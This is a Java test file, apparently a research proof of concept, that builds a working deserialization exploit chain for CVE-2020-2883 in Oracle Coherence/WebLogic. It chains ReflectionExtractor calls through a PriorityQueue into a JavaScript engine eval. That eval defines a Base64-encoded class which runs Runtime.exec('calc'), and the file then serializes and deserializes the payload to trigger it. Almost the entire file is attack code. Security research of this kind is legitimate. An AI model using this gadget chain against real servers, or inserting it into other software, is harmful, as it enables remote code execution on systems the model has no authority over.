package com.feihong.testcase;

import com.feihong.utils.ClassFiles;
import com.feihong.utils.Reflections;
import com.feihong.utils.Util;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import org.apache.shiro.codec.Base64;

import javax.script.ScriptEngineManager;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class TestScriptEnginelAdvancedWithCVE_2020_2883 {
    public static void main(String args[]) throws Exception {
//        byte[] bytes = ClassFiles.classAsBytes(BasicCmdTemplate.class);
//        String classCode = Base64.encodeToString(bytes);

        String classCode = "yv66vgAAADIAHwoABgASCgATABQIABUKABMAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAnTGNvbS9mZWlob25nL3RlbXBsYXRlL0Jhc2ljQ21kVGVtcGxhdGU7AQAKRXhjZXB0aW9ucwcAGQEAClNvdXJjZUZpbGUBABVCYXNpY0NtZFRlbXBsYXRlLmphdmEMAAcACAcAGgwAGwAcAQAEY2FsYwwAHQAeAQAlY29tL2ZlaWhvbmcvdGVtcGxhdGUvQmFzaWNDbWRUZW1wbGF0ZQEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAQABAAcACAACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAAAYABAAHAA0ACAALAAAADAABAAAADgAMAA0AAAAOAAAABAABAA8AAQAQAAAAAgAR";

        String code = "var bytes = org.apache.shiro.codec.Base64.decode('" + classCode + "');\n" +
                "        var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "        try{\n" +
                "            var clazz = classLoader.loadClass('BasicCmdTemplate');\n" +
                "            clazz.newInstance();\n" +
                "        }catch(err){\n" +
                "            var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "            method.setAccessible(true);\n" +
                "            var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "            clazz.newInstance();\n" +
                "        }";

        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getConstructor",
                new Object[]{new Class[0]}
        );

        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "newInstance",
                new Object[]{new Object[0]}
        );

        ReflectionExtractor extractor3 = new ReflectionExtractor(
                "getEngineByName",
                new Object[]{"javascript"}
        );

        ReflectionExtractor extractor4 = new ReflectionExtractor(
                "eval",
                new Object[]{code}
        );

        ReflectionExtractor[] extractors = {
                extractor1,
                extractor2,
                extractor3,
                extractor4
        };

        Class clazz = ChainedExtractor.class.getSuperclass();
        Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
        m_aExtractor.setAccessible(true);

        ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString", new Object[]{});
        ValueExtractor[] valueExtractors1 = new ValueExtractor[]{
                reflectionExtractor
        };

        ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);

        PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
        queue.add("1");
        queue.add("1");
        m_aExtractor.set(chainedExtractor1, extractors);

        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = ScriptEngineManager.class;
        queueArray[1] = "1";

        //序列化
        byte[] finalBytes = Util.serialize(queue);

        //反序列化
        Util.deserialize(finalBytes);
    }
}
